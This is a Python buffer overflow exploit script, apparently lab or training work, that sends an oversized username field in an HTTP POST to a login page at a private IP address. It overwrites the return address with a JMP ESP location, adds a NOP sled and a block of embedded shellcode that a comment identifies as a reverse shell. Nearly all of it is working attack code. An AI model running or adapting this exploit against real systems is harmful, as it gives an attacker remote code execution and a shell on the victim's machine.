#!/usr/bin/python
import socket
import sys

try:
    server = "192.168.216.137"
    port = 80
    size = 800

    filler = b"A" * 780
    eip = b"\x83\x0c\x09\x10" * 4 # Here the address 10090c83 containing the instruction JMP ESP is mentioned in Little Endian format
    offset = b"C" * 4
    nops = b"\x90" * 10
#------------MODIFIED PART------------
    shellcode = bytearray(
        "\xda\xc6\xd9\x74\x24\xf4\xbd\x10\x94\x92\x44\x5e\x31\xc9"
        "\xb1\x52\x31\x6e\x17\x83\xee\xfc\x03\x7e\x87\x70\xb1\x82"
        "\x4f\xf6\x3a\x7a\x90\x97\xb3\x9f\xa1\x97\xa0\xd4\x92\x27"
        "\xa2\xb8\x1e\xc3\xe6\x28\x94\xa1\x2e\x5f\x1d\x0f\x09\x6e"
        "\x9e\x3c\x69\xf1\x1c\x3f\xbe\xd1\x1d\xf0\xb3\x10\x59\xed"
        "\x3e\x40\x32\x79\xec\x74\x37\x37\x2d\xff\x0b\xd9\x35\x1c"
        "\xdb\xd8\x14\xb3\x57\x83\xb6\x32\xbb\xbf\xfe\x2c\xd8\xfa"
        "\x49\xc7\x2a\x70\x48\x01\x63\x79\xe7\x6c\x4b\x88\xf9\xa9"
        "\x6c\x73\x8c\xc3\x8e\x0e\x97\x10\xec\xd4\x12\x82\x56\x9e"
        "\x85\x6e\x66\x73\x53\xe5\x64\x38\x17\xa1\x68\xbf\xf4\xda"
        "\x95\x34\xfb\x0c\x1c\x0e\xd8\x88\x44\xd4\x41\x89\x20\xbb"
        "\x7e\xc9\x8a\x64\xdb\x82\x27\x70\x56\xc9\x2f\xb5\x5b\xf1"
        "\xaf\xd1\xec\x82\x9d\x7e\x47\x0c\xae\xf7\x41\xcb\xd1\x2d"
        "\x35\x43\x2c\xce\x46\x4a\xeb\x9a\x16\xe4\xda\xa2\xfc\xf4"
        "\xe3\x76\x52\xa4\x4b\x29\x13\x14\x2c\x99\xfb\x7e\xa3\xc6"
        "\x1c\x81\x69\x6f\xb6\x78\xfa\x50\xef\x5a\x73\x38\xf2\x5a"
        "\x84\xe9\x7b\xbc\xee\x19\x2a\x17\x87\x80\x77\xe3\x36\x4c"
        "\xa2\x8e\x79\xc6\x41\x6f\x37\x2f\x2f\x63\xa0\xdf\x7a\xd9"
        "\x67\xdf\x50\x75\xeb\x72\x3f\x85\x62\x6f\xe8\xd2\x23\x41"
        "\xe1\xb6\xd9\xf8\x5b\xa4\x23\x9c\xa4\x6c\xf8\x5d\x2a\x6d"
        "\x8d\xda\x08\x7d\x4b\xe2\x14\x29\x03\xb5\xc2\x87\xe5\x6f"
        "\xa5\x71\xbc\xdc\x6f\x15\x39\x2f\xb0\x63\x46\x7a\x46\x8b"
        "\xf7\xd3\x1f\xb4\x38\xb4\x97\xcd\x24\x24\x57\x04\xed\x44"
        "\xba\x8c\x18\xed\x63\x45\xa1\x70\x94\xb0\xe6\x8c\x17\x30"
        "\x97\x6a\x07\x31\x92\x37\x8f\xaa\xee\x28\x7a\xcc\x5d\x48"
        "\xaf")
#------------MODIFIED PART------------
# GOAL HERE IS TO REPLACE THE SHELLCODE WITH THE EXITFUNC=thread DUE TO THE EXPLOIT CLOSING THE WHOLE PROCESS INSTEAD OF TERMINATING JUST THE THREAD AFTER TERMINATING THE REVERSE SHELL
    shellcode += b"D" * (1500 - len(filler) - len(eip) - len(offset))
    inputBuffer = filler + eip + offset + nops + shellcode
    content = b"username=" + inputBuffer + b"&password=A"

    buffer= b"POST /login HTTP/1.1\r\n"
    buffer+= b"Host: " + server.encode() + b"\r\n"
    buffer+= b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
    buffer+= b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer+= b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+= b"Referer: http://"+server.encode()+b"/login\r\n"
    buffer+= b"Connection: close\r\n"
    buffer+= b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+= b"Content-Length: "+str(len(content)).encode()+b"\r\n"
    buffer+= b"\r\n"
    buffer+= content

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
